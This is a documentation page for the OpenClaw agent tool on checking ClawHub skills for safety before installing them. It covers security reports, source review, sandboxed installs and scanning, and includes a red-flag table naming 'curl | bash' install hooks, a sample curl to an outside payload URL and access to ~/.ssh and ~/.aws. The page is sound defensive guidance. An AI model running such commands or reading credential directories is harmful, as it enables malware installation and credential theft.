---
sidebar_position: 4
title: Skill Verification
description: How to review OpenClaw skills for safety before installation
---

# Skill Verification

Given the [malicious skills incident](/security/known-vulnerabilities#malicious-clawhub-skills-february-2026), always review skills before installing them.

## Pre-Installation Checklist

Before installing any skill from ClawHub or external sources:

### 1. Check the Security Report

```bash
openclaw clawhub security-report <skill-name>
```

This shows:
- VirusTotal scan results
- Code safety scanner findings
- Community reports/flags
- Publication date and update history

### 2. Review the Source

```bash
# View the full skill source
openclaw clawhub view <skill-name>
```

Look for red flags:

| Red Flag | Example | Risk |
|----------|---------|------|
| `curl \| bash` in pre_install | Downloading and executing unknown scripts | Malware installation |
| Obfuscated code | Base64-encoded commands | Hidden malicious behavior |
| Excessive tool requests | Skill requesting `shell` + `browser` + `http` for a simple task | Over-privileged |
| Hardcoded external URLs | `curl https://random-domain.xyz/payload` | Data exfiltration |
| `~/.ssh` or `~/.aws` access | Reading credential directories | Credential theft |

### 3. Check the Author

```bash
openclaw clawhub author <author-name>
```

- How many skills have they published?
- How old is their account?
- Do other skills have positive reviews?
- Is the author verified?

### 4. Check Community Signal

- Look at install count and ratings
- Search for the skill name on Discord/GitHub issues
- New skills with zero reviews deserve extra scrutiny

## Safe Installation Practices

```bash
# Install with sandbox (skills can't escape the sandbox)
openclaw clawhub install <skill-name> --sandbox

# Install but don't grant shell access
openclaw clawhub install <skill-name> --no-shell

# Install to a review directory first
openclaw clawhub download <skill-name> --to ~/review/
# ... review the file manually ...
openclaw skill install ~/review/<skill-name>.md
```

## Automated Scanning

OpenClaw v2026.2.6+ includes a built-in code safety scanner:

```bash
# Scan a skill file
openclaw security scan ./skill.md

# Scan all installed skills
openclaw security scan --all
```

The scanner checks for:
- Shell injection patterns
- Network exfiltration attempts
- Credential access attempts
- Known malicious code signatures
- Suspicious `pre_install`/`post_install` hooks

## Reporting Malicious Skills

```bash
# Report a malicious skill on ClawHub
openclaw clawhub report <skill-name> --reason "malicious"

# Or report via GitHub
# https://github.com/openclaw/openclaw/security/advisories
```

## See Also

- [Known Vulnerabilities](/security/known-vulnerabilities) — Full incident history
- [Security Hardening](/security/hardening) — Defense-in-depth configuration
- [ClawHub Guide](/guides/clawhub) — Safe marketplace usage
